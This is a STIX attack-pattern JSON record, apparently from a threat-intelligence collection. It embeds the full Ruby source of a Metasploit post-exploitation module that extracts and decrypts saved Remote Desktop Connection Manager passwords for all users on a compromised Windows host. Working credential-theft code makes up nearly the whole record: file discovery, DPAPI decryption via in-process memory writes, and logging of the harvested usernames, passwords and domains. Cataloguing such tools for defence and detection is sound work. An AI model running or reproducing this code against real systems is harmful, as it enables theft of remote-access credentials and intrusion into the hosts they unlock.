{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c1001662-cf16-402d-8616-33d5381317ba",
    "created": "2024-08-14T16:33:11.447664Z",
    "modified": "2024-08-14T16:33:11.447668Z",
    "name": "Windows Gather Remote Desktop Connection Manager Saved Password Extraction",
    "description": " This module extracts and decrypts saved Microsoft Remote Desktop Connection Manager (RDCMan) passwords the .RDG files of users. The module will attempt to find the files configured for all users on the target system. Passwords for managed hosts are encrypted by default.  In order for decryption of these passwords to be successful this module must be executed under the same account as the user which originally encrypted the password.  Passwords stored in plain text will be captured and documented.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/rdc_manager_creds.rb",
            "external_id": "rdc_manager_creds.rb"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::Windows::Priv\n  include Msf::Auxiliary::Report\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',\n        'Description' => %q{\n          This module extracts and decrypts saved Microsoft Remote Desktop\n          Connection Manager (RDCMan) passwords the .RDG files of users.\n          The module will attempt to find the files configured for all users\n          on the target system. Passwords for managed hosts are encrypted by\n          default.  In order for decryption of these passwords to be successful,\n          this module must be executed under the same account as the user which\n          originally encrypted the password.  Passwords stored in plain text will\n          be captured and documented.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Tom Sellers <tom[at]fadedcode.net>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_config_getuid\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    if is_system?\n      uid = session.sys.config.getuid\n      print_warning(\"This module is running under #{uid}.\")\n      print_warning('Automatic decryption of encrypted passwords will not be possible.')\n      print_warning('Migrate to a user process to achieve successful decryption (e.g. explorer.exe).')\n    end\n\n    settings_file = 'Microsoft Corporation\\\\Remote Desktop Connection Manager\\RDCMan.settings'\n    profiles = grab_user_profiles\n\n    profiles.each do |user|\n      next if user['LocalAppData'].nil?\n\n      settings_path = \"#{user['LocalAppData']}\\\\#{settings_file}\"\n      next unless file?(settings_path)\n\n      print_status(\"Found settings for #{user['UserName']}.\")\n\n      settings = read_file(settings_path)\n      connection_files = settings.scan(%r{string&gt;(.*?)&lt;/string})\n\n      connection_files.each do |con_f|\n        next unless session.fs.file.exist?(con_f[0])\n\n        print_status(\"\\tOpening RDC Manager server list: #{con_f[0]}\")\n        connection_data = read_file(con_f[0])\n        if connection_data\n          parse_connections(connection_data)\n        else\n          print_error(\"\\tUnable to open RDC Manager server list: #{con_f[0]}\")\n          next\n        end\n      end\n    end\n  end\n\n  def decrypt_password(data)\n    session.railgun.add_dll('crypt32') unless session.railgun.get_dll('crypt32')\n\n    pid = client.sys.process.getpid\n    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)\n\n    mem = process.memory.allocate(128)\n    process.memory.write(mem, data)\n\n    if session.sys.process.each_process.find { |i| i['pid'] == pid && i['arch'] == 'x86' }\n      addr = [mem].pack('V')\n      len = [data.length].pack('V')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 8)\n      len, addr = ret['pDataOut'].unpack('V2')\n    else\n      addr = [mem].pack('Q')\n      len = [data.length].pack('Q')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 16)\n      len, addr = ret['pDataOut'].unpack('Q2')\n    end\n\n    return '' if len == 0\n\n    decrypted_pw = process.memory.read(addr, len)\n    return decrypted_pw\n  end\n\n  def extract_password(object)\n    if object.name == 'server'\n      logon_creds = object.elements['logonCredentials']\n    elsif object.elements['properties'] && object.elements['properties'].elements['logonCredentials']\n      logon_creds = object.elements['properties'].elements['logonCredentials']\n    else\n      return nil, nil, nil\n    end\n\n    if logon_creds.attributes['inherit'] == 'None'\n      # The credentials are defined directly on the server\n      username = logon_creds.elements['userName'].text\n      domain = logon_creds.elements['domain'].text\n      if logon_creds.elements['password'].attributes['storeAsClearText'] == 'True'\n        password = logon_creds.elements['password'].text\n      else\n        crypted_pass = Rex::Text.decode_base64(logon_creds.elements['password'].text)\n        password = decrypt_password(crypted_pass)\n        password = Rex::Text.to_ascii(password)\n        if password.blank?\n          print_warning(\"\\tUnable to decrypt password, try migrating to a process running as the file's owner.\")\n        end\n      end\n\n    elsif logon_creds.attributes['inherit'] == 'FromParent'\n      # The credentials are inherited from a parent\n      parent = object.parent\n      username, password, domain = extract_password(parent)\n    end\n\n    return username, password, domain\n  end\n\n  def parse_connections(connection_data)\n    doc = REXML::Document.new(connection_data)\n\n    # Process all of the server records\n    doc.elements.each('//server') do |server|\n      svr_name = server.elements['name'].text\n      username, password, domain = extract_password(server)\n      if server.elements['connectionSettings'].attributes['inherit'] == 'None'\n        port = server.elements['connectionSettings'].elements['port'].text\n      else\n        port = 3389\n      end\n\n      print_status(\"\\t\\t#{svr_name} \\t#{username} #{password} #{domain}\")\n      register_creds(svr_name, username, password, domain, port) if password || username\n    end\n\n    # Process all of the gateway elements, irrespective of server\n    doc.elements.each('//gatewaySettings') do |gateway|\n      next unless gateway.attributes['inherit'] == 'None'\n\n      svr_name = gateway.elements['hostName'].text\n      username = gateway.elements['userName'].text\n      domain = gateway.elements['domain'].text\n\n      if gateway.elements['password'].attributes['storeAsClearText'] == 'True'\n        password = gateway.elements['password'].text\n      else\n        crypted_pass = Rex::Text.decode_base64(gateway.elements['password'].text)\n        password = decrypt_password(crypted_pass)\n        password = Rex::Text.to_ascii(password)\n      end\n\n      parent = gateway.parent\n      if parent.elements['connectionSettings'].attributes['inherit'] == 'None'\n        port = parent.elements['connectionSettings'].elements['port'].text\n      else\n        port = 3389\n      end\n\n      print_status(\"\\t\\t#{svr_name} \\t#{username} #{password} #{domain}\")\n      register_creds(svr_name, username, password, domain, port) if password || username\n    end\n  end\n\n  def register_creds(host_ip, user, pass, realm, port)\n    # Note that entries added by hostname instead of IP will not\n    # generate complete records.  See discussion here:\n    # https://github.com/rapid7/metasploit-framework/pull/3599#issuecomment-51710319\n\n    # Build service information\n    service_data = {\n      address: host_ip,\n      port: port,\n      service_name: 'rdp',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    # Build credential information\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_data: pass,\n      private_type: :password,\n      username: user,\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n      realm_value: realm,\n      workspace_id: myworkspace_id\n    }\n\n    credential_data.merge!(service_data)\n    credential_core = create_credential(credential_data)\n\n    # Assemble the options hash for creating the Metasploit::Credential::Login object\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      workspace_id: myworkspace_id\n    }\n\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}